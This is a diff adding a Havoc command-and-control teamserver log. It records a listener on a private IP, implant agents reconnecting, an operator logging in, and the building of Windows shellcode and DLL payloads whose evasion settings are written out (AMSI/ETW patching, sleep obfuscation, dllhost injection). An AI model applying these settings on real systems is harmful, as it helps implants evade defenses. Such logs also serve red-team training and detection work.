@@ -1,0 +1,75 @@
+              _______           _______  _______ 
+    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
+    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
+    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
+    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
+    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
+    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
+    │/     \││/     \│   \_/   (_______)(_______/
+
+  	 pwn and elevate until it's done
+
+[10:32:29] [DBUG] [cmd.init.func2:59]: Debug mode enabled
+[10:32:29] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
+[10:32:29] [INFO] Havoc profile: ./profiles/havoc.yaotl
+[10:32:29] [INFO] Build: 
+ - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
+ - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
+ - Nasm         : /usr/bin/nasm
+[10:32:29] [INFO] Time: 15/07/2024 10:32:29
+[10:32:29] [INFO] Teamserver logs saved under: data/loot/2024.07.15._10:32:29
+[10:32:29] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
+[10:32:29] [INFO] Starting Teamserver on wss://0.0.0.0:40056
+[10:32:29] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
+[10:32:29] [INFO] Opens existing database: data/teamserver.db
+[10:32:29] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
+[10:32:29] [INFO] Starting 1 listeners from last session
+[10:32:29] [DBUG] [handlers.(*HTTP).Start:204]: Setup HTTP/s Server
+[10:32:29] [INFO] Started "1" listener: http://192.168.17.137:80
+[10:32:29] [INFO] Restored 19 agents from last session
+[10:32:29] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
+[10:32:29] [DBUG] [certs.generateCertificate:223]: Valid from 2023-12-21 10:32:29.322605896 -0500 EST to 2026-12-20 10:32:29.322605896 -0500 EST
+[10:32:29] [DBUG] [certs.generateCertificate:228]: Serial Number: 120334040998479525643937085754645074066
+[10:32:29] [DBUG] [certs.generateCertificate:234]: Authority certificate
+[10:32:29] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
+[10:32:29] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
+[10:32:29] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
+[10:32:29] [DBUG] [handlers.handleDemonAgent:84]: Agent: 7daa34d6, Command: DEMON_INIT
+[10:32:29] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[10:32:29] [DBUG] [handlers.handleDemonAgent:95]: reconnected f3e4aa84
+[10:32:30] [DBUG] [handlers.handleDemonAgent:84]: Agent: 19948ae, Command: DEMON_INIT
+[10:32:30] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[10:32:30] [DBUG] [handlers.handleDemonAgent:95]: reconnected c99776fa
+[10:32:31] [DBUG] [handlers.handleDemonAgent:84]: Agent: 64c3ca24, Command: DEMON_INIT
+[10:32:31] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[10:32:31] [DBUG] [handlers.handleDemonAgent:95]: reconnected 4eb94a08
+[10:32:31] [DBUG] [handlers.handleDemonAgent:84]: Agent: 82c70da, Command: DEMON_INIT
+[10:32:31] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[10:32:31] [DBUG] [handlers.handleDemonAgent:95]: reconnected c12dc053
+[10:32:33] [DBUG] [handlers.handleDemonAgent:84]: Agent: 7c2145c2, Command: DEMON_INIT
+[10:32:33] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[10:32:33] [DBUG] [handlers.handleDemonAgent:95]: reconnected ab11b9cc
+[10:32:52] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: BDO
+[10:32:52] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User BDO is authenticated
+[10:32:52] [GOOD] User <BDO> Authenticated
+[10:33:00] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[10:33:00] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:%windir%\sysnative\dllhost.exe Spawn64:%windir%\sysnative\dllhost.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Foliage Stack Duplication:false]
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[10:33:00] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/557fc9a547/1711958ed4.o
+[10:33:00] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/557fc9a547/c05da7404c.o
+[10:33:00] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
+[10:33:00] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[10:33:00] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:%windir%\sysnative\dllhost.exe Spawn64:%windir%\sysnative\dllhost.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Foliage Stack Duplication:false]
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[10:33:00] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[10:33:00] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/2adb71b7eb/d6c33ea74f.o
+[10:33:00] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/2adb71b7eb/73eeaf6522.o
+[10:33:00] [DBUG] [builder.(*Builder).Build:379]: Compile dll
+[10:36:13] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
